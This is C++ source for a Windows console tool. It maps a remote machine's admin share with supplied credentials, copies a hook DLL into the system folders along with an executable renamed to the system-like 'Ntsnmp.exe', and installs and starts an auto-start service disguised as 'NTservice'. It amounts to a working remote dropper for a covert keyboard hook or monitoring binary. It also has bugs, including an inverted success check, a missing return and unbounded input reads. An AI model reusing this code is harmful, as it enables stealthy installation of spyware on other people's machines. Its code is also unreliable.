// InstallService.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <conio.h>

#define SERVICENAME        "NTservice"
#define LONGSERVICENAME    "NTservice"


SERVICE_STATUS          ServiceStatus; 
SERVICE_STATUS_HANDLE   ServiceStatusHandle; 

bool bWindows;


//the pointer returned should be deleted by the calling function.
char* GetErrorString(DWORD dwError)
{
	LPVOID ErrStr;

	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, dwError, 0, (LPTSTR)&ErrStr, 0, NULL);
	return (char*)ErrStr;
}


BOOL ConnectToRemote(const char *FullRemoteName, const char *LocalPath,
								const char *UserName, const char *Password, BOOL bConnect)
{


	if(bConnect)
	{
		if(FullRemoteName == NULL
		||LocalPath == NULL
		||UserName == NULL
		|| Password == NULL)
		{
			return false;
		}

		NETRESOURCE nr;
		nr.dwType = RESOURCETYPE_ANY;
		nr.lpLocalName = (LPTSTR)LocalPath;
		nr.lpRemoteName = (LPTSTR)FullRemoteName;
		nr.lpProvider = NULL;


		DWORD rc = WNetAddConnection2(&nr, Password, UserName, CONNECT_INTERACTIVE);
		DWORD dw = GetLastError();
		if(rc == NO_ERROR)
			return TRUE;
		else
			return FALSE;
	}
	else
	{
		if(FullRemoteName == NULL)
		{
			return FALSE;
		}
		//disconnect
		DWORD rc = WNetCancelConnection2( FullRemoteName, 0, TRUE );
		if(rc == NO_ERROR)
			return TRUE;
		else
			return FALSE;
	}

}


// Installs and starts the remote service on remote machine
BOOL InstallAndStartRemoteService(char *MachineName)
{
   // Open remote Service Manager
   SC_HANDLE hSCM = ::OpenSCManager( MachineName, NULL, 
			SC_MANAGER_ALL_ACCESS);
   DWORD dw = GetLastError();
   if (hSCM == NULL)
      return FALSE;
   
   // Maybe it's already there and installed, let's try to run
   SC_HANDLE hService =::OpenService( hSCM, SERVICENAME, SERVICE_ALL_ACCESS );

   // Creates service on remote machine, if it's not installed yet
   if ( hService == NULL )
   {
	   if(bWindows)
	   {
		   hService = ::CreateService(
			hSCM, SERVICENAME, LONGSERVICENAME,
			SERVICE_ALL_ACCESS, 
			SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
			"c:\\windows\\SysWOW64\\ntservice.exe",
			NULL, NULL, NULL, NULL, NULL );
	   }
	   else
	   {
			hService = ::CreateService(
			hSCM, SERVICENAME, LONGSERVICENAME,
			SERVICE_ALL_ACCESS, 
			SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
			"c:\\windows\\system32\\ntservice.exe",
			NULL, NULL, NULL, NULL, NULL );
	   }
   }
   
   if (hService == NULL)
   {
      ::CloseServiceHandle(hSCM);
      return FALSE;
   }

   // Start service
   if ( !StartService( hService, 0, NULL ) )
      return FALSE;

   dw = GetLastError();

   ::CloseServiceHandle(hService);
   ::CloseServiceHandle(hSCM);

   return TRUE;
}


// Deletes service
void DeleteSvc(char *MachineName)
{
   // Open service manager
   SC_HANDLE hSCM = ::OpenSCManager(MachineName, NULL, SC_MANAGER_ALL_ACCESS);

   if (hSCM == NULL)
      return;

   // OPen service
   SC_HANDLE hService = ::OpenService( hSCM, SERVICENAME, SERVICE_ALL_ACCESS );

   if (hService == NULL)
   {
      ::CloseServiceHandle(hSCM);
      return;
   }

   int retval = ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);

   /**
   // Stop the service
   ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
   ServiceStatus.dwCheckPoint         = 0; 
   ServiceStatus.dwWaitHint           = 0; 
   ServiceStatus.dwWin32ExitCode      = 0; 
   ServiceStatus.dwServiceSpecificExitCode = 0; 
   SetServiceStatus (ServiceStatusHandle, &ServiceStatus); 
*/

   // Deletes service from service database
   DeleteService( hService );
   

   ::CloseServiceHandle(hService);
   ::CloseServiceHandle(hSCM);
}

bool copyBinaries(char* TempStr, char* LocalDrive)
{
	//copy the hook
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\kHookdll.dll");
	else
		strcat(TempStr, "\\windows\\system32\\kHookdll.dll");



	CopyFile("kHookdll.dll", TempStr, FALSE);
	int retval = GetLastError();
	if(retval == 0)
	{
		printf("\nCopied kHookdll.dll");

	}
	else
	{
		char *err;

		printf("\nCopy failed (kHookdll.dll). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);

		//disconnect and return false
		ConnectToRemote(LocalDrive, NULL, NULL, NULL, FALSE);
		return false;
	}

	//copy the binary
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\Ntsnmp.exe");
	else
		strcat(TempStr, "\\windows\\system32\\Ntsnmp.exe");
	CopyFile("Xplorer_c.exe", TempStr, FALSE);
	retval = GetLastError();
	if(retval == 0)
	{
		printf("\nCopied Xplorer_c.exe");

	}
	else
	{
		char *err;

		printf("\nCopy failed (Xplorer_c.exe). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);

		//disconnect and return false
		ConnectToRemote(LocalDrive, NULL, NULL, NULL, FALSE);

		return false;
	}

	//copy the ini file
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\Xplorer_c.ini");
	else
		strcat(TempStr, "\\windows\\system32\\Xplorer_c.ini");
	CopyFile("Xplorer_c.ini", TempStr, FALSE);
	retval = GetLastError();
	if(retval == 0)
	{
		printf("\nCopied Xplorer_c.ini");

	}
	else
	{
		char *err;

		printf("\nCopy failed (Xplorer_c.ini). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);

		//disconnect and return false
		ConnectToRemote(LocalDrive, NULL, NULL, NULL, FALSE);

		return false;
	}



	//copy the service
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\NTservice.exe");
	else
		strcat(TempStr, "\\windows\\system32\\NTservice.exe");

	CopyFile("ntservice.exe", TempStr, FALSE);
	retval = GetLastError();
	if(retval == 0)
	{
		printf("\nCopied HookService.exe");

	}
	else
	{
		char *err;

		printf("\nCopy failed (HookService.exe). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);

		//disconnect and return false
		ConnectToRemote(LocalDrive, NULL, NULL, NULL, FALSE);

		return false;
	}
}

bool removeBinaries(char* TempStr, char* LocalDrive)
{
	bool bFlag = true;

	//remove the hook
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\kHookdll.dll");
	else
		strcat(TempStr, "\\windows\\system32\\kHookdll.dll");

	remove(TempStr);
	int retval = GetLastError();
	if(retval == 0)
	{
		printf("\nRemoved kHookdll.dll");
	}
	else
	{
		char *err;
		printf("\nRemove failed (kHookdll.dll). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);
		bFlag = false;
	}

	//remove the binary
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\Ntsnmp.exe");
	else
		strcat(TempStr, "\\windows\\system32\\Ntsnmp.exe");
	remove(TempStr);
	retval = GetLastError();
	if(retval == 0)
	{
		printf("\nRemoved Xplorer_c.exe");
	}
	else
	{
		char *err;
		printf("\nRemoved failed (Xplorer_c.exe). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);
		bFlag = false;
	}

	//remove the ini file
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\Xplorer_c.ini");
	else
		strcat(TempStr, "\\windows\\system32\\Xplorer_c.ini");
	remove(TempStr);
	retval = GetLastError();
	if(retval == 0)
	{
		printf("\nRemove Xplorer_c.ini");
	}
	else
	{
		char *err;
		printf("\nRemove failed (Xplorer_c.ini). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);
		bFlag = false;
	}



	//remove the service
	strcpy(TempStr, LocalDrive);
	if(bWindows)
		strcat(TempStr, "\\windows\\SysWOW64\\NTservice.exe");
	else
		strcat(TempStr, "\\windows\\system32\\NTservice.exe");

	remove(TempStr);
	retval = GetLastError();
	if(retval == 0)
	{
		printf("\nRemoved HookService.exe");

	}
	else
	{
		char *err;

		printf("\nRemoved failed (HookService.exe). Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);
		bFlag = false;
	}

	return bFlag;
}

void setupWindowsBitness(char* TempStr, char* LocalDrive)
{
	// check for 32/64bit windows
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;


	strcpy(TempStr, LocalDrive);
	strcat(TempStr, "\\windows\\SysWOW64");		

	hFind = FindFirstFile(TempStr, &FindFileData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		//winnt
		bWindows = FALSE;

	}
	else
	{
		//windows
		bWindows = TRUE;
	}
}

int main(int argc, char* argv[])
{
	
	char RemotePath[255];
	char LocalDrive[16];
	char UserName[32];
	char Password[32];
	char TempStr[255];
	char MachineName[32];
	char Install;
	char ch;
	int index;
	
	
	printf("Enter Full remote path to map.\neg: (\\\\MachineName\\c$): ");
	scanf("%s", &RemotePath);

	
	printf("\n\nEnter a drive name to set\n eg: (Z:): ");
	scanf("%s",&LocalDrive);
	
	printf("\n\nEnter user name of the machine: ");
	scanf("%s", &UserName);

	printf("\n\nEnter password of the machine: ");
	index = 0;
	do
	{
		ch = getch();
		Password[index++] = ch;

	}while(ch != '\r');
	Password[--index] = '\0';

	fflush(stdin);
	printf("\n\nInstall service?(y/n): ");
	scanf("%c",&Install);


	printf("\nConnecting...");
	if(!ConnectToRemote(RemotePath, LocalDrive, UserName, Password, TRUE))
	{
		char *err;

		printf("\nConnection Failed. Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);
		return false;
	}
	else
	{
		printf("\nConnected Yippieeee!!! ");
	}

	//extract machine name
	int len = strlen(RemotePath);
	strcpy(MachineName, RemotePath);
	MachineName[len-3] = '\0';

	// Install service and start
	setupWindowsBitness(TempStr, LocalDrive);

	// delete service and cleanup
	if(tolower(Install) != 'y')
	{
		DeleteSvc(MachineName);
		removeBinaries(TempStr, LocalDrive);
		ConnectToRemote(LocalDrive, NULL, NULL, NULL, FALSE);
		return true;
	}
	
	copyBinaries(TempStr, LocalDrive);

	//start the service
	int retval = InstallAndStartRemoteService(MachineName);
	if(retval == 0)
	{
		printf("\nService installed");
	}
	else
	{
		char *err;
		
		printf("\nService install failed. Reason: %s.", err = GetErrorString(GetLastError()));
		LocalFree(err);		
	}

	//disconnect
	ConnectToRemote(LocalDrive, NULL, NULL, NULL, FALSE);
	printf("\nDisconnected");

		
	return 0;
}
